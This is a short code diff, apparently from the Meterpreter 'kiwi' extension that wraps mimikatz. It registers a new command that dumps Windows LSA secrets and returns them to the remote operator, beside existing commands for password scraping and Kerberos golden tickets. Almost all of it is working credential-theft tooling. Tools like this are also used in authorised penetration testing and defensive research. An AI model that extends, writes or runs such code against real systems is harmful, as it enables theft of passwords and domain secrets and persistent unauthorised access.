@@ -19,14 +19,29 @@ EnableDelayLoadMetSrv();
 DWORD request_scrape_passwords(Remote *remote, Packet *packet);
 DWORD request_golden_ticket_create(Remote *remote, Packet *packet);
 DWORD request_golden_ticket_use(Remote *remote, Packet *packet);
+DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet);
 
 Command customCommands[] =
 {
     COMMAND_REQ("kiwi_scrape_passwords", request_scrape_passwords),
     COMMAND_REQ("kiwi_golden_ticket_use", request_golden_ticket_use),
     COMMAND_REQ("kiwi_golden_ticket_create", request_golden_ticket_create),
+    COMMAND_REQ("kiwi_lsa_dump_secrets", request_lsa_dump_secrets),
     COMMAND_TERMINATOR
 };
+
+DWORD request_lsa_dump_secrets(Remote *remote, Packet *packet)
+{
+	DWORD result;
+	Packet * response = packet_create_response(packet);
+
+	dprintf("[KIWI] Dumping LSA Secrets");
+
+	result = mimikatz_lsa_dump_secrets(response);
+	packet_transmit_response(result, remote, response);
+
+	return ERROR_SUCCESS;
+}
 
 DWORD request_golden_ticket_use(Remote *remote, Packet *packet)
 {
